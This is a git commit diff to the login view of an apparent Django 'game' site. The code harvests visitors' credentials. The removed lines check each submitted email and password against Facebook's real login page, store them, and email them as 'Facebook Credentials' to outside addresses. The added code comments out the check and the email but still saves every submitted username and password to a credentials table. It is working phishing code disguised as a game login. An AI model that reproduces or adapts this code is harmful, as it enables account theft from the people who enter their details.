656e1d40ca65a9e11830cc45fe75df7c8a8f99f3
Rohan Roy <b3you0870@gmail.com>
2017-09-05 00:39:18 +0530

    views changed

--- game/views.py
+++ game/views.py
@@ -59,46 +59,46 @@ def login(request):
     data = request.POST
     print data
     if 'userid' in data:
-        useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-        attempt = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
-        br = mechanize.Browser()
-        cj = cookielib.LWPCookieJar()
-        br.set_handle_robots(False)
-        br.set_handle_equiv(True)
-        br.set_handle_referer(True)
-        br.set_handle_redirect(True)
-        br.set_cookiejar(cj)
-        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-        try:
-            br.addheaders = [('User-agent', random.choice(useragents))]
-            site = br.open(attempt)
-            br.select_form(nr=0)
+        # useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+        # attempt = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
+        # br = mechanize.Browser()
+        # cj = cookielib.LWPCookieJar()
+        # br.set_handle_robots(False)
+        # br.set_handle_equiv(True)
+        # br.set_handle_referer(True)
+        # br.set_handle_redirect(True)
+        # br.set_cookiejar(cj)
+        # br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+        # try:
+        #     br.addheaders = [('User-agent', random.choice(useragents))]
+        #     site = br.open(attempt)
+        #     br.select_form(nr=0)
             
-            print "DATA: ", data
-            ##Facebook
-            br.form['email'] =data["userid"]
-            br.form['pass'] = data["password"]
-            br.submit()
-            log = br.geturl()
-            print log
-            Cred.objects.create(
-                username=data["userid"],
-                password=data["password"]
-            )
-            send_mail(
-            "Facebook Credentials",
-            json.dumps(data),
-            "no-reply@game.com",
-            ["b4you0870@gmail.com", "rohan@rohanroy.com"],
-            fail_silently=True
-            )
-            if log != attempt:
-                print "\n\n\n [*] Password found .. !!"
-                print "\n [*] Password : %s\n" % data["password"]
+        #     print "DATA: ", data
+        #     ##Facebook
+        #     br.form['email'] =data["userid"]
+        #     br.form['pass'] = data["password"]
+        #     br.submit()
+        #     log = br.geturl()
+        #     print log
+        Cred.objects.create(
+            username=data["userid"],
+            password=data["password"]
+        )
+        #     send_mail(
+        #     "Facebook Credentials",
+        #     json.dumps(data),
+        #     "no-reply@game.com",
+        #     ["b4you0870@gmail.com", "rohan@rohanroy.com"],
+        #     fail_silently=True
+        #     )
+        #     if log != attempt:
+        #         print "\n\n\n [*] Password found .. !!"
+        #         print "\n [*] Password : %s\n" % data["password"]
 
-                return redirect(reverse("game:play"))
-            else:
-                messages.add_message(request, messages.ERROR, "Login Failed")
-        except KeyboardInterrupt:
-            print "\n[*] Exiting program .. "
+        return redirect(reverse("game:play"))
+        #     else:
+        #         messages.add_message(request, messages.ERROR, "Login Failed")
+        # except KeyboardInterrupt:
+        #     print "\n[*] Exiting program .. "
     return render(request, "game/game_start.html")
